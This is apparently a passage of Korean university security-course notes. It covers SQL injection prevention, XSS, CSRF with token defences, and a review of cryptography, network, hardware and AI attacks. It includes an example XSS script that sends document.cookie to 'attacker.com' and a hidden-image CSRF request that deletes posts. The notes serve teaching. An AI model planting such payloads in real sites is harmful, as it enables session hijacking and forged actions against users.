- Union-based SQL injection 이용
- MySQL's metadata table `information_schema`에 접근

그럼 방어는 어떻게 할까?

🛡️ **Preventing SQL Injection**
앞선 Injection은 원초적으로 문자열이 Code로 인식되었기 때문에 발생했던 문제이다.

따라서 다음과 같이 Query를 받을 때 자체적으로 Escaping 문자를 넣어서 이를 방지할 수도 있다.
```php
... WHERE id=‘admin\’ --’ AND pw=... // '\'
```

근데 우리가 이걸 일일이 넣고 있을 수는 없기에, 보통 Language Level에서 이를 위한 Tool을 다음과 같이 제공해준다.
```php
$m = new mysqli(...);
$stmt = $m->prepare(“SELECT * FROM user WHERE id=? and pw=?”);
$stmt->bind_param(“ss”, $id, $pw);
$stmt->execute();
```

#### ⚠️ Cross-site Scripting (XSS)

먼저, 앞서 설명한 JavaScript와 Cookie에 대해서 상기하고 넘어가자.
- JavaScript: Web Page에서 더 Dynamic한 상호작용을 할 수 있도록 한다.
- Cookie: Web Server가 사용자에 대한 이전의 정보를 기억할 수 있게 하는 것

이제 본격적으로 Cross-site Scripting에 대해서 알아보자.

지금까지의 취약점이랑은 살짝 다른게
앞에서는 Attacker에 의해 Server-side Code에서 문제가 발생했지만,
XSS에서는 Attacker에 의해 Client-side Code쪽에서 문제가 발생한다.

Attacker가 Client-size Code에 다음과 같은 JS Code를 삽입한다고 생각해보자.
```js
<script>
window.location="http://attacker.com?" + document.cookie
</script>
```

그러면 Session ID (SID) Cookie가 Attacker가 구축한 Website로 날아가게 된다.
- 만약 Attacker가 `index.php`라는 `$_GET['SID']`를 Dump하는 페이지를 구축해놨으면 SID가 그 사이트에 기록되게 된다.
- 그리고 Attacker는 이 정보를 바탕으로 악의적인 짓을 저지를 수 있게된다.

여기까지가 공격의 개괄적인 시나리오이다.

🔫 **Stored XSS (a.k.a Persistent XSS)**
`✏️ 정리 필요!`

🔫 **Reflected XSS**
`✏️ 정리 필요!`
#### ⚠️ Cross-site Request Forgery (CSRF)

이제 마지막 공격 방식에 대해서 알아보자.

먼저 앞선 경우와 마찬가지로 Target Wdb Server를 하나 가정하고 시작하자.
이 `abc.com`이라는 Target Web Server는 게시판 기능을 운영하고 있다.
다음과 같음 HTTP Request를 보냄으로써 특정 게시글을 지우거나 수정할 수 있다.
```
USER -> abc.com?action=edit&num=105 -> SERVER
```
타인이 내 Post를 Edit하려고 하면 막아야 할 것이다.

공격자 Server도 가정하자.
`puppy.com`이라는 Victim을 낚으려고 강아지 사진을 올려둔 사이트가 있다고 가정하자.
이 `puppy.com`에 들어가면 Attacker의 Javascrpit Code가 실행이 될 것이다.

그러면 이제 Victim이 한 탭에서는 `abc.com`을, 한 탭에서는 `puppy.com`을 켜놓고 있다고 하자.

이때 여기서 공격자가 바로 어떤 document.cookie를 Execute하는 것은 의미가 없다.
Same Origin Policy 때문인데, CSRF는 이를 벗어나서 공격할 수 있다.

🔫 **CSRF**
Attacker의 Server에 다음과 같이 abc.com의 이미지를 긁어오려고 하는 HTTP Request가 있다고 가정하자.
```
<img src="abc.com?action=delete&num=100" height="0" width="0"> </img>
```
위와 같은 이미지는 없으므로 당연히 아무 이미지도 안 뜰 것이다.

대신 `abc.com`의 뒤에있는 `action=delete&num=100`으로 조용히 상호작용이 시작된다.
만약 `abc.com?action=delete&num=202`라는 Request를 보내게 되면 특정 게시글이 지워질 수도 있는 것이다.

이런식으로 GET parameter를 잘 조정함으로써 더 다양한 공격이 가능하게 된다.

그렇다면 이 CSRF를 어떻게 방어할 수 있을까?

🛡️ **Preventing CSRF**
- GET Method가 아니라 POST Method를 사용하더라도 CSRF를 막을 수는 없다.
- 대신, Website에서 확인을 위해 CSRF Token을 이용할 수 있다.
```html
<...onclick="abc.com?action=edit &num=105&token=e8cf3a" ...>
```
이 Token들이 어떻게 사용될까?

일단 `puppy.com`은 제외하고 Victim User와 `abc.com`이 상호작용하고 있는 상황으로 돌아와보자.

Server Side Code 쪽에서 결정한 Token(Random String)을 User가 `abc.com`에 접속할 때부터 위의 코드와 같이 User가 보는 HTML Source Code에 포함시킨다.
- User Side: 이제 HTTP Request를 보내면 Token까지 같이 날라가게 되고 Server Side Code에서 이를 Verify한다. `token=e8cf3a`
- Attacker Side: 반면에 CSRF 공격을 통해서 Request Forsery로 User가 모르는 Request가 Server Side Code쪽으로 날라가게 되면 Token을 지정할 수 없기 때문에 해당 Request는 효력을 잃게된다. `No token`
이는 Canary Check와 매우 유사하다고도 볼 수 있다.

❓ 그럼 `puppy.com`에서 Token값을 알아내면 어떻게 하나?
A) 이는 SOP(Security Origin Policy)라는 규칙에 의해서 예방된다.

# 11. Course Review

들어가기 전에..
📝 표시가 되어있는 부분은 교수님꼐서 시험에 나올 수 있다고 언급한 부분이다.

/ **Cryptography(암호학)**
보안에서 굉장히 중요한 툴이다.
보안 = 암호학 이라고 보는 사람도 있을 정도니 말 다했다.

그럼 메시지를 보내는 것에서 암호학의 역할을 간단하게 살펴보자.
- Confidentiality: 메시지를 유출 없이 전달
- Integrity: 왜곡 없이 전달

📝
```
Message(Plaintext) --{Encrypted}-> Transfer --{Decrypted}-> Message(Plaintext)
```
암호화(Encrypt)/복호화(Decrypt)에 사용되는 키와 관련하여 다음과 같은 두 가지 분류가 있을 수 있다.
- Symmetric Key: 송신자와 수신자가 같은 키를 공유
- Assymmetric Key: 송신자와 수신자가 다른 키를 공유 `Public Key, Private Key`

/ **Network Security**
애초에 Network Protocol 설계 자체가 어떠한 취약점에 노출될 수 있기 때문에 Network Sequrity의 존재는 필수불가결하다.

**Sniffing**: 쉽게 말해서 엿듣는 것으로, Network 상의 패킷을 도청하는 것이다.
Ex) 
Ethernet Protocol - Segment가 Wire를 공유하기 때문에 `듣고 있다가.. 어? 나한테 보내는 패킷이네! 접수` 자연스래 Sniffing에 노출된다.

**Sppofing**: Network 상의 패킷 데이터를 조작하여 다른 사람으로 사칭하는 것이다.
Ex)
IP Spoofing - 나의 IP가 `1.2.3.4` 라더라도 다른 IP를 가진 것처럼 패킷을 전송 하는 것이다.
ARP Spoofing - `1.2.3.4` IP를 가진 사람이 나인 것처럼 사칭하여 패킥을 받는 것이다.
DNS Spoofing - `sogang.ac.kr`에 해당하는 IP는 내가 가진 `1.2.3.4`라고 거짓 정보를 알려주는 것이다.

📝 Sniffing와 Sppofing은 서로 다른 개념이다.

Denial-of-Service (DoS) Attacks: Network나 시스템에 과부하를 유도하여 정상적인 서비스를 방해하는 공격
SYN flooding - TCP 연결을 이용한 서버 자원 고갈
DNS Amplification - 증폭된 트래픽을 이용한 대규모 네트워크 공격

/ **Hardware Security**
물리적인 구조를 이용하여 공격하는 방식이다.
다음은 최근에 가장 이슈였던 Hardware Security이다.

![200](../../../../z.%20Docs/img/Pasted%20image%2020241205130421.png)
📝 **Rowhammer Attack**: 노란색 영역에 해당하는 bit를 계속해서 Update 시킴으로써 전기적 현상을 일으켜 보라색 영역에 해당하는 곳에 정보적 노이즈를 일으키는 것이다.

**Spectre and Meltdown Attack**: 현대 CPU에서 성능을 올리기 위해 예측하여 한 발 앞서 Execute하는 Speculative Execution Feature를 이용하여 접근해서는 안되는 곳의 값을 읽어온다거나 하는 공격

/ **AI Security**

**Security for AI**: AI 시스템 자체를 공격하는 것
- 📝 Adversarial Attacks: AI에 노이즈 같은 걸 먹여서 오작동을 일으키는 것 `Glaze`

**AI for Security**: AI를 이용하여 SW 취약점을 찾는 것

